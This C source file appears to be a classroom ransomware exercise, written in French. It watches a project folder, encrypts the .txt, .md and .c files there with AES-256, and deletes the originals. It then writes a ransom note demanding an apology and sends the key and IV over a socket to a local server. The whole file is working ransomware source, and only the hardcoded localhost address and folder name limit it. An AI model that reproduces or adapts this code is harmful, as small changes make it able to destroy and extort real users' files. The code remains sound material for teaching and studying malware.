#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <arpa/inet.h>

#define WATCHED_DIR "TP/Projet"
#define TIMER_SECONDS 10
#define KEY_LEN 32
#define IV_LEN 16

void envoyer_cle_iv(const unsigned char *key, const unsigned char *iv) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return;
    }

    char payload[KEY_LEN + IV_LEN + 8];
    memcpy(payload, "SENDKEY:", 8);
    memcpy(payload + 8, key, KEY_LEN);
    memcpy(payload + 8 + KEY_LEN, iv, IV_LEN);

    send(sock, payload, sizeof(payload), 0);
    close(sock);
}

int dossier_existe(const char *chemin) {
    struct stat st;
    return (stat(chemin, &st) == 0 && S_ISDIR(st.st_mode));
}

int chiffrer_fichier(const char *filepath, const unsigned char *key, const unsigned char *iv) {
    FILE *in = fopen(filepath, "rb");
    if (!in) return -1;

    char outpath[512];
    snprintf(outpath, sizeof(outpath), "%s.enc", filepath);
    FILE *out = fopen(outpath, "wb");
    if (!out) {
        fclose(in);
        return -1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char buffer[1024], outbuf[1040];
    int len, outlen;

    while ((len = fread(buffer, 1, sizeof(buffer), in)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, buffer, len);
        fwrite(outbuf, 1, outlen, out);
    }

    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    remove(filepath);
    return 0;
}

int main() {
    while (!dossier_existe(WATCHED_DIR)) {
        sleep(5);
    }

    sleep(TIMER_SECONDS);

    unsigned char key[KEY_LEN], iv[IV_LEN];
    RAND_bytes(key, KEY_LEN);
    RAND_bytes(iv, IV_LEN);

    DIR *dir = opendir(WATCHED_DIR);
    struct dirent *entry;
    char fullpath[512];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG &&
            (strstr(entry->d_name, ".txt") || strstr(entry->d_name, ".md") || strstr(entry->d_name, ".c")) &&
            !strstr(entry->d_name, ".enc")) {
            snprintf(fullpath, sizeof(fullpath), "%s/%s", WATCHED_DIR, entry->d_name);
            chiffrer_fichier(fullpath, key, iv);
        }
    }
    closedir(dir);

    char ransom_path[512];
    snprintf(ransom_path, sizeof(ransom_path), "%s/RANCON.txt", WATCHED_DIR);
    FILE *ransom = fopen(ransom_path, "w");
    if (ransom) {
        fprintf(ransom,
            "#########################################\n"
            "#        [!] FICHIERS CHIFFRES [!]       #\n"
            "#########################################\n\n"
            "Vos fichiers dans ce dossier ont ete chiffres par ProManager,\n"
            "car la date limite de remise du projet a ete depassee.\n\n"
            "Chaque fichier a ete chiffre en AES-256 avec une cle unique.\n\n"
            "Ne tentez pas de modifier les fichiers .enc, vous risqueriez\n"
            "de les rendre irrecuperables.\n\n"
            "-----------------------------------------\n\n"
            "Pour recuperer vos fichiers :\n\n"
            "1. Lancez le programme client_decrypt disponible dans le dossier TP/.\n"
            "2. Connectez-vous au serveur de l'administration via l'adresse suivante :\n"
            "   - Adresse : 127.0.0.1\n"
            "   - Port    : 4242\n"
            "3. Le serveur vous demandera une justification ecrite.\n"
            "   Redigez un message d'excuse sincere (minimum 20 caracteres).\n"
            "4. Si vos excuses sont acceptees, vous recevrez automatiquement :\n"
            "   - La cle de dechiffrement\n"
            "   - Le vecteur d'initialisation (IV)\n"
            "5. Le programme client_decrypt dechiffrera ensuite vos fichiers.\n\n"
            "-----------------------------------------\n\n"
            "Si vous avez deja presente vos excuses,\n"
            "vous pouvez relancer client_decrypt directement.\n\n"
            "Fichiers cibles : .txt, .md, .c, etc.\n"
            "Delai ecoule : 1h apres la creation du dossier Projet/\n\n"
            "Ce ransomware est un exercice pedagogique.\n"
        );
        fclose(ransom);
    }

    envoyer_cle_iv(key, iv);
    return 0;
}
